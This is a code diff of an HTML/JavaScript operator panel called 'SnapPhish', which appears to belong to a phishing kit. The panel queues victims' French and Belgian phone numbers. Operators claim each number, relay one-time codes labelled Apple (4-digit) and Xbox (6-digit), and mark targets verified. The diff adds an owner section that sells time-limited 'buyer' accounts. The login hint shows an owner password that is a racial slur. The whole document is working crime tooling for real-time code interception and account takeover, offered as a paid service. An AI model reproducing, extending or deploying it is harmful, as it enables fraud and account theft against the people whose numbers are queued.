@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Admin Panel — Snap Phish</title>
+    <title>SnapPhish — Admin Panel</title>
     <style>
         * {
             margin: 0;
@@ -19,9 +19,10 @@
             color: #fff;
         }
 
-        .admin-container { max-width: 1000px; margin: 0 auto; }
+        .admin-container { max-width: 1100px; margin: 0 auto; }
 
-        .admin-header {
+        /* ===== HEADER ===== */
+        .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -30,19 +31,40 @@
             border-radius: 16px;
             border: 1px solid #2a2a2a;
             margin-bottom: 24px;
+            flex-wrap: wrap;
+            gap: 10px;
         }
 
-        .admin-header h1 { font-size: 22px; font-weight: 600; }
-        .admin-header h1 span { color: #FFFC00; }
-        .admin-header .logout { color: #ff6b6b; cursor: pointer; font-size: 14px; }
+        .header h1 { font-size: 22px; font-weight: 600; }
+        .header h1 span { color: #FFFC00; }
+        .header .user-info { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+        .header .role-badge {
+            background: #2a2a2a;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            text-transform: uppercase;
+        }
+        .header .role-badge.owner { background: #FFFC00; color: #000; }
+        .header .logout {
+            color: #ff6b6b;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 6px 16px;
+            border-radius: 10px;
+            border: 1px solid #ff6b6b;
+            transition: all 0.3s;
+        }
+        .header .logout:hover { background: #ff6b6b; color: #000; }
 
+        /* ===== STATS ===== */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
             gap: 12px;
             margin-bottom: 24px;
         }
-
         .stat-card {
             background: #1a1a1a;
             padding: 16px;
@@ -50,17 +72,16 @@
             border: 1px solid #2a2a2a;
             text-align: center;
         }
-
         .stat-card .num { font-size: 28px; font-weight: 700; color: #FFFC00; }
         .stat-card .label { color: #888; font-size: 12px; margin-top: 4px; }
 
+        /* ===== QUEUE TABS ===== */
         .queue-tabs {
             display: flex;
             gap: 8px;
             margin-bottom: 20px;
             flex-wrap: wrap;
         }
-
         .queue-tab {
             padding: 10px 20px;
             border-radius: 12px;
@@ -72,7 +93,6 @@
             font-weight: 500;
             transition: all 0.2s;
         }
-
         .queue-tab:hover { border-color: #444; }
         .queue-tab.active { border-color: #FFFC00; background: #1a1a1a; }
         .queue-tab .badge {
@@ -84,12 +104,8 @@
             margin-left: 6px;
         }
 
-        .numbers-list {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
+        /* ===== NUMBER CARDS ===== */
+        .numbers-list { display: flex; flex-direction: column; gap: 12px; }
         .number-card {
             background: #1a1a1a;
             border-radius: 14px;
@@ -100,19 +116,13 @@
             align-items: center;
             justify-content: space-between;
             transition: border-color 0.2s;
+            gap: 12px;
         }
-
         .number-card .info { flex: 1; min-width: 150px; }
         .number-card .info .num { font-size: 18px; font-weight: 600; color: #fff; }
         .number-card .info .meta { color: #888; font-size: 13px; margin-top: 2px; }
 
-        .number-card .actions {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-            margin-top: 8px;
-        }
-
+        .number-card .actions { display: flex; gap: 8px; flex-wrap: wrap; }
         .number-card .actions button {
             padding: 8px 16px;
             border-radius: 10px;
@@ -122,7 +132,6 @@
             cursor: pointer;
             transition: all 0.2s;
         }
-
         .number-card .actions button:hover { transform: scale(1.03); }
 
         .btn-claim { background: #FFFC00; color: #000; }
@@ -130,7 +139,7 @@
         .btn-otp6 { background: #ffaa00; color: #000; }
         .btn-wrong { background: #ff6b6b; color: #fff; }
         .btn-verified { background: #69db7c; color: #000; }
-        .btn-claimed { background: #333; color: #888; cursor: not-allowed; }
+        .btn-resend { background: #339af0; color: #fff; }
 
         .otp-display {
             display: inline-block;
@@ -142,6 +151,18 @@
             color: #FFFC00;
             margin-right: 8px;
         }
+        .otp-input-field {
+            background: #141414;
+            border: 2px solid #2a2a2a;
+            border-radius: 8px;
+            padding: 6px 12px;
+            color: #fff;
+            font-size: 16px;
+            width: 120px;
+            outline: none;
+            margin-right: 8px;
+        }
+        .otp-input-field:focus { border-color: #FFFC00; }
 
         .empty-state {
             text-align: center;
@@ -150,15 +171,80 @@
             font-size: 15px;
         }
 
+        /* ===== OWNER SECTION ===== */
+        .owner-section {
+            background: #1a1a1a;
+            border-radius: 16px;
+            padding: 20px;
+            border: 1px solid #2a2a2a;
+            margin-bottom: 20px;
+        }
+        .owner-section h3 {
+            color: #FFFC00;
+            margin-bottom: 12px;
+            font-size: 18px;
+        }
+        .owner-section .input-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .owner-section .input-group input {
+            flex: 1;
+            min-width: 120px;
+            padding: 10px 14px;
+            border-radius: 10px;
+            border: 2px solid #2a2a2a;
+            background: #121212;
+            color: #fff;
+            outline: none;
+        }
+        .owner-section .input-group input:focus { border-color: #FFFC00; }
+        .owner-section .input-group button {
+            padding: 10px 20px;
+            border-radius: 10px;
+            border: none;
+            background: #FFFC00;
+            color: #000;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .owner-section .input-group button:hover { transform: scale(1.02); }
+
+        .buyer-list { margin-top: 12px; }
+        .buyer-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 12px;
+            background: #121212;
+            border-radius: 8px;
+            margin-bottom: 6px;
+            border: 1px solid #2a2a2a;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .buyer-item .name { color: #fff; font-weight: 500; }
+        .buyer-item .date { color: #888; font-size: 12px; }
+        .buyer-item .del {
+            color: #ff6b6b;
+            cursor: pointer;
+            font-size: 12px;
+            padding: 2px 10px;
+            border-radius: 6px;
+            border: 1px solid #ff6b6b;
+        }
+        .buyer-item .del:hover { background: #ff6b6b; color: #000; }
+
+        /* ===== LOGIN ===== */
         .login-box {
-            max-width: 380px;
+            max-width: 400px;
             margin: 80px auto;
             background: #1a1a1a;
             padding: 32px 28px;
             border-radius: 24px;
             border: 1px solid #2a2a2a;
         }
-
         .login-box h2 { text-align: center; margin-bottom: 20px; color: #fff; }
         .login-box input {
             width: 100%;
@@ -184,49 +270,100 @@
             cursor: pointer;
         }
         .login-box button:hover { transform: scale(1.02); }
+        .login-box .role-select {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        .login-box .role-select button {
+            padding: 8px 24px;
+            border-radius: 10px;
+            border: 2px solid #2a2a2a;
+            background: #121212;
+            color: #fff;
+            cursor: pointer;
+            font-size: 14px;
+            width: auto;
+        }
+        .login-box .role-select button.active {
+            border-color: #FFFC00;
+            background: #1a1a1a;
+        }
 
         .hidden { display: none !important; }
 
         @media (max-width: 600px) {
             .number-card { flex-direction: column; align-items: stretch; }
             .number-card .actions { justify-content: center; }
+            .header { flex-direction: column; align-items: stretch; text-align: center; }
+            .header .user-info { justify-content: center; }
         }
     </style>
 </head>
 <body>
 
-    <!-- LOGIN -->
+    <!-- ===== LOGIN PAGE ===== -->
     <div id="loginPage">
         <div class="login-box">
-            <h2>🔐 Admin Login</h2>
-            <input type="text" id="loginUser" placeholder="Username" value="admin" />
-            <input type="password" id="loginPass" placeholder="Password" value="admin123" />
+            <h2>🔐 SnapPhish Login</h2>
+            <div class="role-select">
+                <button id="loginOwnerBtn" class="active">Owner</button>
+                <button id="loginBuyerBtn">Buyer</button>
+            </div>
+            <input type="text" id="loginUser" placeholder="Username" />
+            <input type="password" id="loginPass" placeholder="Password" />
             <button onclick="login()">Login →</button>
-            <p style="color:#555;text-align:center;margin-top:12px;font-size:13px;">Default: admin / admin123</p>
+            <p style="color:#555;text-align:center;margin-top:12px;font-size:13px;">
+                Owner: owner / nigga
+            </p>
         </div>
     </div>
 
-    <!-- ADMIN PANEL -->
+    <!-- ===== ADMIN PANEL ===== -->
     <div id="adminPage" class="hidden">
         <div class="admin-container">
-            <div class="admin-header">
+            <!-- HEADER -->
+            <div class="header">
                 <h1>💀 <span>Snap</span>Phish</h1>
-                <span class="logout" onclick="logout()">Logout</span>
+                <div class="user-info">
+                    <span class="role-badge" id="roleBadge">Owner</span>
+                    <span id="userDisplay" style="font-size:14px;color:#888;">admin</span>
+                    <span class="logout" onclick="logout()">Logout</span>
+                </div>
             </div>
 
+            <!-- STATS -->
             <div class="stats-grid" id="statsGrid">
                 <div class="stat-card"><div class="num" id="statTotal">0</div><div class="label">Total</div></div>
                 <div class="stat-card"><div class="num" id="statPending">0</div><div class="label">Pending</div></div>
+                <div class="stat-card"><div class="num" id="statOtpSent">0</div><div class="label">OTP Sent</div></div>
                 <div class="stat-card"><div class="num" id="statVerified">0</div><div class="label">Verified</div></div>
                 <div class="stat-card"><div class="num" id="statWrong">0</div><div class="label">Wrong</div></div>
             </div>
 
+            <!-- OWNER SECTION -->
+            <div id="ownerSection" class="hidden">
+                <div class="owner-section">
+                    <h3>👑 Owner Panel — Create Buyer Accounts</h3>
+                    <div class="input-group">
+                        <input type="text" id="newBuyerUser" placeholder="Buyer Username" />
+                        <input type="text" id="newBuyerPass" placeholder="Password" />
+                        <input type="number" id="newBuyerDays" placeholder="Days (30)" value="30" style="min-width:80px;" />
+                        <button onclick="createBuyer()">Create Buyer</button>
+                    </div>
+                    <div class="buyer-list" id="buyerList"></div>
+                </div>
+            </div>
+
+            <!-- QUEUE TABS -->
             <div class="queue-tabs" id="queueTabs">
                 <div class="queue-tab active" onclick="switchQueue('A')">🇫🇷 France <span class="badge" id="countA">0</span></div>
                 <div class="queue-tab" onclick="switchQueue('B')">🇧🇪 Belgium <span class="badge" id="countB">0</span></div>
                 <div class="queue-tab" onclick="switchQueue('C')">🌍 Both <span class="badge" id="countC">0</span></div>
             </div>
 
+            <!-- NUMBERS LIST -->
             <div id="numbersContainer">
                 <div class="empty-state">Select a queue to view pending numbers.</div>
             </div>
@@ -234,45 +371,101 @@
     </div>
 
     <script>
+        // ============================================================
+        // STATE
+        // ============================================================
         let token = null;
         let currentQueue = 'A';
         let refreshInterval = null;
+        let currentRole = 'owner';
+        let currentUsername = '';
+
+        // ============================================================
+        // ROLE SELECT (LOGIN)
+        // ============================================================
+        document.getElementById('loginOwnerBtn').addEventListener('click', function() {
+            document.querySelectorAll('.role-select button').forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
+        });
+
+        document.getElementById('loginBuyerBtn').addEventListener('click', function() {
+            document.querySelectorAll('.role-select button').forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
+        });
+
+        // Enter key on login
+        document.getElementById('loginPass').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') login();
+        });
+
+        document.getElementById('loginUser').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') document.getElementById('loginPass').focus();
+        });
 
         // ============================================================
         // LOGIN
         // ============================================================
-        function login() {
-            const username = document.getElementById('loginUser').value;
-            const password = document.getElementById('loginPass').value;
-            
-            fetch('/api/admin/auth', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username, password })
-            })
-            .then(res => res.json())
-            .then(data => {
+        async function login() {
+            const username = document.getElementById('loginUser').value.trim();
+            const password = document.getElementById('loginPass').value.trim();
+
+            if (!username || !password) {
+                alert('Enter username and password.');
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/auth/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+
+                const data = await response.json();
+
                 if (data.success) {
                     token = data.token;
+                    currentRole = data.role;
+                    currentUsername = data.username;
+
                     document.getElementById('loginPage').classList.add('hidden');
                     document.getElementById('adminPage').classList.remove('hidden');
+
+                    document.getElementById('roleBadge').textContent = currentRole.toUpperCase();
+                    document.getElementById('roleBadge').className = 'role-badge ' + currentRole;
+                    document.getElementById('userDisplay').textContent = currentUsername;
+
+                    if (currentRole === 'owner') {
+                        document.getElementById('ownerSection').classList.remove('hidden');
+                        loadBuyers();
+                    } else {
+                        document.getElementById('ownerSection').classList.add('hidden');
+                    }
+
                     loadQueues();
                     refreshInterval = setInterval(loadQueues, 3000);
                 } else {
-                    alert('Invalid credentials');
+                    alert('Login failed: ' + data.message);
                 }
-            });
+            } catch (error) {
+                alert('Connection error.');
+            }
         }
 
+        // ============================================================
+        // LOGOUT
+        // ============================================================
         function logout() {
             clearInterval(refreshInterval);
             token = null;
             document.getElementById('adminPage').classList.add('hidden');
             document.getElementById('loginPage').classList.remove('hidden');
+            document.getElementById('loginPass').value = '';
+            document.getElementById('loginUser').value = '';
         }
 
         // ============================================================
-        // QUEUE SWITCH
+        // SWITCH QUEUE
         // ============================================================
         function switchQueue(queue) {
             currentQueue = queue;
@@ -284,82 +477,94 @@
         // ============================================================
         // LOAD QUEUES
         // ============================================================
-        function loadQueues() {
-            fetch('/api/admin/queues')
-                .then(res => res.json())
-                .then(data => {
-                    // Update counts
-                    document.getElementById('countA').textContent = data.A?.filter(e => e.status === 'pending').length || 0;
-                    document.getElementById('countB').textContent = data.B?.filter(e => e.status === 'pending').length || 0;
-                    document.getElementById('countC').textContent = data.C?.filter(e => e.status === 'pending').length || 0;
+        async function loadQueues() {
+            try {
+                const response = await fetch('/api/admin/queues');
+                const data = await response.json();
 
-                    // Stats
-                    const all = Object.values(data).flat();
-                    document.getElementById('statTotal').textContent = all.length;
-                    document.getElementById('statPending').textContent = all.filter(e => e.status === 'pending').length;
-                    document.getElementById('statVerified').textContent = all.filter(e => e.status === 'verified').length;
-                    document.getElementById('statWrong').textContent = all.filter(e => e.status === 'wrong').length;
+                // Update counts
+                document.getElementById('countA').textContent = data.A?.filter(e => e.status === 'pending' || e.status === 'claimed').length || 0;
+                document.getElementById('countB').textContent = data.B?.filter(e => e.status === 'pending' || e.status === 'claimed').length || 0;
+                document.getElementById('countC').textContent = data.C?.filter(e => e.status === 'pending' || e.status === 'claimed').length || 0;
 
-                    // Render queue
-                    const entries = data[currentQueue] || [];
-                    const pending = entries.filter(e => e.status === 'pending' || e.status === 'otp_sent');
-                    const container = document.getElementById('numbersContainer');
+                // Stats
+                const all = Object.values(data).flat();
+                document.getElementById('statTotal').textContent = all.length;
+                document.getElementById('statPending').textContent = all.filter(e => e.status === 'pending' || e.status === 'claimed').length;
+                document.getElementById('statOtpSent').textContent = all.filter(e => e.status === 'otp_sent').length;
+                document.getElementById('statVerified').textContent = all.filter(e => e.status === 'verified').length;
+                document.getElementById('statWrong').textContent = all.filter(e => e.status === 'wrong').length;
 
-                    if (pending.length === 0) {
-                        container.innerHTML = '<div class="empty-state">🎯 No pending numbers in this queue.</div>';
-                        return;
-                    }
+                // Render queue
+                const entries = data[currentQueue] || [];
+                const pending = entries.filter(e => e.status === 'pending' || e.status === 'claimed' || e.status === 'otp_sent');
+                const container = document.getElementById('numbersContainer');
 
-                    container.innerHTML = pending.map(entry => `
-                        <div class="number-card" id="card-${entry.id}">
-                            <div class="info">
-                                <div class="num">📱 ${entry.number}</div>
-                                <div class="meta">${entry.country} · ${entry.network} · ${entry.timestamp.slice(0,16)}</div>
-                                ${entry.otp ? `<div class="otp-display">📨 ${entry.otp}</div>` : ''}
-                                ${entry.status === 'otp_sent' ? '<span style="color:#FFFC00;font-size:13px;">⏳ OTP Sent</span>' : ''}
-                            </div>
-                            <div class="actions" id="actions-${entry.id}">
-                                ${entry.status === 'pending' ? `
-                                    <button class="btn-claim" onclick="claimNumber('${entry.id}')">🎯 Claim</button>
-                                ` : `
-                                    <button class="btn-otp4" onclick="sendOTP('${entry.id}', 4)">🔢 4-Digit</button>
-                                    <button class="btn-otp6" onclick="sendOTP('${entry.id}', 6)">🔢 6-Digit</button>
-                                    <button class="btn-wrong" onclick="markWrong('${entry.id}')">❌ Wrong</button>
-                                    <button class="btn-verified" onclick="markVerified('${entry.id}')">✅ Verified</button>
-                                `}
-                            </div>
+                if (pending.length === 0) {
+                    container.innerHTML = '<div class="empty-state">🎯 No pending numbers in this queue.</div>';
+                    return;
+                }
+
+                container.innerHTML = pending.map(entry => `
+                    <div class="number-card" id="card-${entry.id}">
+                        <div class="info">
+                            <div class="num">📱 ${entry.number}</div>
+                            <div class="meta">${entry.country} · ${entry.network} · ${entry.timestamp.slice(0,16)}</div>
+                            ${entry.otp ? `<div class="otp-display">📨 ${entry.otp}</div>` : ''}
+                            ${entry.status === 'otp_sent' ? '<span style="color:#FFFC00;font-size:13px;">⏳ OTP Sent</span>' : ''}
+                            ${entry.status === 'claimed' ? '<span style="color:#ffaa00;font-size:13px;">📌 Claimed</span>' : ''}
+                            ${entry.claimed_by ? `<span style="color:#888;font-size:12px;">by ${entry.claimed_by}</span>` : ''}
                         </div>
-                    `).join('');
-                });
+                        <div class="actions" id="actions-${entry.id}">
+                            ${entry.status === 'pending' ? `
+                                <button class="btn-claim" onclick="claimNumber('${entry.id}')">🎯 Claim</button>
+                            ` : entry.status === 'claimed' ? `
+                                <button class="btn-otp4" onclick="sendOTP('${entry.id}', 4)">🔢 4-Digit (Apple)</button>
+                                <button class="btn-otp6" onclick="sendOTP('${entry.id}', 6)">🔢 6-Digit (Xbox)</button>
+                                <button class="btn-wrong" onclick="markWrong('${entry.id}')">❌ Wrong</button>
+                                <button class="btn-verified" onclick="markVerified('${entry.id}')">✅ Verified</button>
+                                <button class="btn-resend" onclick="resendOTP('${entry.id}')">🔄 Resend</button>
+                            ` : entry.status === 'otp_sent' ? `
+                                <button class="btn-otp4" onclick="sendOTP('${entry.id}', 4)">🔢 4-Digit (Apple)</button>
+                                <button class="btn-otp6" onclick="sendOTP('${entry.id}', 6)">🔢 6-Digit (Xbox)</button>
+                                <button class="btn-wrong" onclick="markWrong('${entry.id}')">❌ Wrong</button>
+                                <button class="btn-verified" onclick="markVerified('${entry.id}')">✅ Verified</button>
+                                <button class="btn-resend" onclick="resendOTP('${entry.id}')">🔄 Resend</button>
+                            ` : ''}
+                        </div>
+                    </div>
+                `).join('');
+
+            } catch (error) {
+                console.error('Load error:', error);
+            }
         }
 
         // ============================================================
         // CLAIM NUMBER
         // ============================================================
         function claimNumber(queueId) {
-            // Update UI to show claimed
-            const actions = document.getElementById(`actions-${queueId}`);
-            actions.innerHTML = `
-                <button class="btn-otp4" onclick="sendOTP('${queueId}', 4)">🔢 4-Digit</button>
-                <button class="btn-otp6" onclick="sendOTP('${queueId}', 6)">🔢 6-Digit</button>
-                <button class="btn-wrong" onclick="markWrong('${queueId}')">❌ Wrong</button>
-                <button class="btn-verified" onclick="markVerified('${queueId}')">✅ Verified</button>
-            `;
-            
-            // Also update status in backend
             fetch('/api/admin/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ queueId: queueId, action: 'claimed' })
-            }).catch(() => {});
+                body: JSON.stringify({
+                    queueId: queueId,
+                    action: 'claimed',
+                    username: currentUsername
+                })
+            }).then(() => loadQueues());
         }
 
         // ============================================================
-        // OTP ACTIONS
+        // SEND OTP
         // ============================================================
         function sendOTP(queueId, length) {
-            const otp = String(Math.floor(Math.random() * (length === 4 ? 9000 : 900000)) + (length === 4 ? 1000 : 100000));
-            
+            const otp = prompt(`Enter ${length}-digit OTP from Apple/Xbox:`);
+            if (!otp || otp.length !== length) {
+                alert(`Please enter exactly ${length} digits.`);
+                return;
+            }
+
             fetch('/api/admin/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -368,53 +573,156 @@
                     action: length === 4 ? 'otp_4' : 'otp_6',
                     otp: otp
                 })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) {
-                    // Update UI
-                    const card = document.getElementById(`card-${queueId}`);
-                    const info = card.querySelector('.info');
-                    const otpDisplay = document.createElement('div');
-                    otpDisplay.className = 'otp-display';
-                    otpDisplay.textContent = `📨 ${otp}`;
-                    
-                    // Remove old OTP display if exists
-                    const oldOtp = card.querySelector('.otp-display');
-                    if (oldOtp) oldOtp.remove();
-                    
-                    info.appendChild(otpDisplay);
-                    
-                    // Add status
-                    const statusSpan = document.createElement('span');
-                    statusSpan.style.cssText = 'color:#FFFC00;font-size:13px;margin-left:8px;';
-                    statusSpan.textContent = '⏳ OTP Sent';
-                    const oldStatus = card.querySelector('span[style]');
-                    if (oldStatus) oldStatus.remove();
-                    info.appendChild(statusSpan);
-                }
-            });
+            }).then(() => loadQueues());
         }
 
+        // ============================================================
+        // MARK WRONG
+        // ============================================================
         function markWrong(queueId) {
-            if (!confirm('Mark as wrong number?')) return;
+            if (!confirm('Mark this number as wrong?')) return;
             fetch('/api/admin/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ queueId: queueId, action: 'wrong' })
-            })
-            .then(() => loadQueues());
+            }).then(() => loadQueues());
         }
 
+        // ============================================================
+        // MARK VERIFIED
+        // ============================================================
         function markVerified(queueId) {
-            if (!confirm('Mark as verified?')) return;
+            if (!confirm('Mark this number as verified?')) return;
             fetch('/api/admin/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ queueId: queueId, action: 'verified' })
-            })
-            .then(() => loadQueues());
+            }).then(() => loadQueues());
         }
+
+        // ============================================================
+        // RESEND OTP
+        // ============================================================
+        function resendOTP(queueId) {
+            fetch('/api/admin/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ queueId: queueId, action: 'resend' })
+            }).then(() => loadQueues());
+        }
+
+        // ============================================================
+        // OWNER: CREATE BUYER
+        // ============================================================
+        async function createBuyer() {
+            const username = document.getElementById('newBuyerUser').value.trim();
+            const password = document.getElementById('newBuyerPass').value.trim();
+            const days = parseInt(document.getElementById('newBuyerDays').value) || 30;
+
+            if (!username || !password) {
+                alert('Enter username and password.');
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/auth/create_buyer', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        token: token,
+                        username: username,
+                        password: password,
+                        days: days
+                    })
+                });
+
+                const data = await response.json();
+                if (data.success) {
+                    alert(`Buyer ${username} created for ${days} days!`);
+                    document.getElementById('newBuyerUser').value = '';
+                    document.getElementById('newBuyerPass').value = '';
+                    loadBuyers();
+                } else {
+                    alert('Error: ' + data.message);
+                }
+            } catch (error) {
+                alert('Connection error.');
+            }
+        }
+
+        // ============================================================
+        // OWNER: LOAD BUYERS
+        // ============================================================
+        async function loadBuyers() {
+            try {
+                const response = await fetch('/api/auth/list_buyers', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token: token })
+                });
+
+                const data = await response.json();
+                const list = document.getElementById('buyerList');
+
+                if (!data.success || data.buyers.length === 0) {
+                    list.innerHTML = '<p style="color:#555;font-size:14px;">No buyers created yet.</p>';
+                    return;
+                }
+
+                list.innerHTML = data.buyers.map(b => `
+                    <div class="buyer-item">
+                        <span class="name">${b.username}</span>
+                        <span class="date">Expires: ${b.expiry ? b.expiry.slice(0,10) : 'Never'}</span>
+                        <span class="del" onclick="deleteBuyer('${b.username}')">Delete</span>
+                    </div>
+                `).join('');
+            } catch (error) {
+                console.error('Load buyers error:', error);
+            }
+        }
+
+        // ============================================================
+        // OWNER: DELETE BUYER
+        // ============================================================
+        async function deleteBuyer(username) {
+            if (!confirm(`Delete buyer ${username}?`)) return;
+
+            try {
+                const response = await fetch('/api/auth/delete_buyer', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token: token, username: username })
+                });
+
+                const data = await response.json();
+                if (data.success) {
+                    alert(data.message);
+                    loadBuyers();
+                } else {
+                    alert('Error: ' + data.message);
+                }
+            } catch (error) {
+                alert('Connection error.');
+            }
+        }
+
+        // ============================================================
+        // ENTER KEY ON CREATE BUYER
+        // ============================================================
+        document.getElementById('newBuyerPass').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') createBuyer();
+        });
+
+        document.getElementById('newBuyerUser').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') document.getElementById('newBuyerPass').focus();
+        });
+
+        // ============================================================
+        // INIT
+        // ============================================================
+        // Show login page by default
+        document.getElementById('loginPage').classList.remove('hidden');
+        document.getElementById('adminPage').classList.add('hidden');
     </script>
 
 </body>
